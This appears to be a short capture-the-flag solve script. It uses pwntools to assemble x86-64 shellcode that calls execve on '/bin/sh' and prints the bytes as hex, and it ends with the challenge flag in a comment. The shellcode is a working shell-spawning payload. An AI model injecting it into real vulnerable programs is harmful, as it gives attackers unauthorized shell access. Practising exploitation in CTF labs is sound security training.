#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"


shellcode = asm('''
    mov dword ptr [rsp], 0x6e69622f
    mov dword ptr [rsp+4], 0x0068732f
    mov rdi, rsp
    mov eax, 59      
    sub rsi, rsi
    sub rdx, rdx
    syscall
''')

print(shellcode.hex())

#NNS{sh0uld_h4ve_impl3m3nt3d_b0g0sort_inst34d_af4fbc8c57f4}